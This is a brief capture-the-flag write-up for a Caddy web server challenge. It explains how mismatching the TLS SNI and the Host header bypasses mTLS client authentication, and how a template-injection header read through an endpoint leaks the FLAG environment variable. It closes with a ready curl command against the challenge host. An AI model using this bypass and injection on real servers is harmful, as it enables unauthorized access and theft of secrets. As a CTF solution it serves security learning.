# Ez ⛳ v3 

Set `SNI=public` and `Host: private` to bypass `client_auth` (mTLS).

Then use `/fetch/headers` and add header ```Anything: {{ env `FLAG` }}``` to get flag, note `"` and `'` will not work due to quoting.
Note: `httpInclude` will weirdly do another server-side rendering i.e. SSTI, see <https://github.com/caddyserver/caddy/blob/d57ab215a2f198a465ea33abe4588bb5696e7abd/modules/caddyhttp/templates/tplcontext.go#L211>

```bash
curl -sk 'https://public.caddy.chal-kalmarc.tf/fetch/headers' -H 'Host: private.caddy.chal-kalmarc.tf' -H 'Anything: {{ env `FLAG` }}'
```
